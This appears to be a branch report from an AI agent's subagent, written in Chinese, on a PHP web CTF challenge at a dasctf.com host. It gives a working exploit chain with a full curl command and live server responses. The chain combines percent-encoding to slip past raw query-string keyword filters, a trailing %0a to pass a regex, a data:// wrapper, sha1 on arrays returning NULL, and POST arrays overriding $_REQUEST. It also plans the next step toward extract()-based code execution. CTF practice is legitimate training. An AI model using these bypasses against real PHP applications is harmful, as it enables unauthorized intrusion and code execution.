## Branch Result
direction: request_merge_chain
subagent_id: branch_001
status: FEASIBLE

### 发现
- PHP 先对原始 `$_SERVER['QUERY_STRING']` 做关键词匹配，但参数名和值逐字节百分号编码后，原始查询串中不再出现 `file`、`debu`、`aqua`、`shana`、`passwd` 等连续关键词；PHP 解析后 `$_GET` 仍恢复正确键和值。
- `debu=aqua_is_cute%0a` 可通过 `/^aqua_is_cute$/`，且严格比较时又不等于 `aqua_is_cute`，因此 `$file` 会被赋为 GET 中的值。
- `file=data://text/plain,debu_debu_aqua` 使 `file_get_contents($file)` 精确返回 `debu_debu_aqua`。
- GET 使用不同数组 `shana[0]=1` 与 `passwd[0]=2`。PHP 7.3 的 `sha1(array)` 都返回 `NULL`，所以严格哈希比较成立；两个数组内容不同，所以 `$shana != $passwd` 也成立。
- POST 提交所有同名键为数组后，默认 GET/POST 请求合并顺序下 POST 值覆盖 `$_REQUEST` 的同名 GET 值，但不会改变 `$_GET`。因此 `foreach ($_REQUEST as $value)` 中这些值全为数组，`preg_match` 返回 false，绕过字母过滤。
- 组合链在远端 PHP/7.3.13 实测成功，响应依次包含 `Neeeeee! Good Job!` 和 `Very good! you know my password.`。

### 命令和结果
可工作的 curl 参数前半段如下；后续动态函数参数可继续追加在 URL 查询串末尾，并在 POST 中为对应顶层键增加同名数组覆盖：

```bash
target='http://370debe8ad762a09ea90e53f.http-ctf2.dasctf.com/1nD3x.php'
qs='%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61%5b%30%5d=1&%70%61%73%73%77%64%5b%30%5d=2'
curl -sS -X POST "$target?$qs" \
  --data 'file[]=1&debu[]=1&shana[]=1&passwd[]=1'
```

关键输出：

```text
Neeeeee! Good Job!
Very good! you know my password. But what is flag?
Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=
```

最后一行是预期结果：此验证尚未向 `extract($_GET['flag'])` 提供后半段的 `code`/`arg`，但已经证明请求合并前半链完整通过。

对照实验：

```text
无 POST 同名覆盖:
Neeeeee! Good Job!
fxck you! I hate English!

debu 去掉末尾 %0a:
Aqua is the cutest five-year-old child in the world! Isn't it ?

shana[0] 与 passwd[0] 都为 1:
Neeeeee! Good Job!
fxck you! you don't know my password! And you don't know sha1! why you come here!
```

实测响应保存为：
- `/tmp/branch001_chain1.html`
- `/tmp/branch001_no_post.html`
- `/tmp/branch001_no_nl.html`
- `/tmp/branch001_same_arrays.html`

### 结论
FEASIBLE。该前半链已在目标服务实际通过。建议后半段把 `flag[code]`、`flag[arg]` 等 GET 键和值也逐字节百分号编码，并在 POST body 中增加 `flag[]=1`，使 `$_GET['flag']` 保留供 `extract()` 使用，而 `$_REQUEST['flag']` 被 POST 数组覆盖以继续绕过 foreach 字母过滤。应使用 curl 原样发送上述 URL；部分高级 HTTP 客户端会把 `%66` 一类未保留字符规范化回明文，从而重新触发 raw QUERY_STRING 关键词过滤。
